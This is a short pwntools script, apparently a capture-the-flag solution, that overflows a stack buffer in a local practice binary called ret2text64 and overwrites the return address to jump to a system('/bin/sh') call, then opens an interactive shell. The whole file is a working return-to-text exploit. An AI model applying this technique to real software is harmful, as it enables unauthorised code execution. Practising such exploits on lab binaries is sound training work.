from pwn import *

context.arch = "amd64"
context.log_level = "debug"

io = process("../attachments/ret2text64")
elf = ELF("../attachments/ret2text64")

system_bin_sh = 0x0040133D

payload = flat([cyclic(0x30), "A" * 8, system_bin_sh])

io.sendlineafter("How much data do you want to store (in bytes)?\n", b"200")
io.sendafter("Enter your secret data now:\n", payload)

io.interactive()
